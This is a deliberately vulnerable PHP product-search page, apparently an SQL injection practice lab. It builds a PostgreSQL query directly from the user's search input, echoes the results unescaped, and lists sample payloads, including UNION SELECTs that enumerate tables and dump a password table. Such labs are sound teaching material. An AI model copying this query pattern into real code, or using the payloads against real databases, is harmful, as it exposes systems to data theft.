<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>SQL Injection Practice</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
	<link rel="stylesheet" href="index.css">
</head>
<body class="w-70 mx-auto">
	<form action="" role="form" method="get">
		<div class="well text-center ">
			<h1> Product Search </h1><br>
			<div class="row w-70 mx-auto">
				<div class="col-sm-10">
					<input type="text" class="form-control input-lg f-25" name="search">
				</div>
				<button type="submit" class="btn btn-primary col-sm-2 f-25">Search</button>
			</div>
			
			<table class='table table-hover table-bordered text-left mt-1 white w-70 mx-auto'>
				<thead>
					<tr>
						<th>SQL INJECTIONS EXAMPLE</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td> ';-- </td>
					</tr>
					<tr>
						<td> --	' UNION(SELECT TABLE_NAME, TABLE_SCHEMA,3 FROM information_schema.tables);-- </td>
					</tr>
					<tr>
						<td> --	' UNION(SELECT *, 3 FROM password);-- </td>
					</tr>
				</tbody>
			</table>
			
		</div>
	</form>
	
	<div class="well f-25">
		<table class="table">
			<thead>
				<tr>
					<th scope="col">#</th>
					<th scope="col">Product Name</th>
					<th scope="col">Price</th>
					<th scope="col">Quantity in Stock</th>
				</tr>
			</thead>
			<tbody>
				<?php
					if(isset($_GET['search']) && $_GET['search'] !== ''){
						$search = $_GET['search'];
						include_once('include/connectDB.php');
						$query = "SELECT name, price, quantity FROM product 
											WHERE name LIKE '%$search%'";
						$resultQuery = queryDB($query);
						$totalRows = pg_num_rows($resultQuery);
						for($i = 0; $i < $totalRows; $i++){
							$num = $i+1;
							$name = pg_fetch_result($resultQuery, $i, 0);
							$price = pg_fetch_result($resultQuery, $i, 1);
							$quantity = pg_fetch_result($resultQuery, $i, 2);
							echo "
								<tr>
									<th scope='row'>$num</th>
									<td>$name</td>
									<td>$price</td>
									<td>$quantity</td>
								</tr>
							";
						}
					}
				?>
			</tbody>
		</table>
	</div>
	
</body>
</html>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>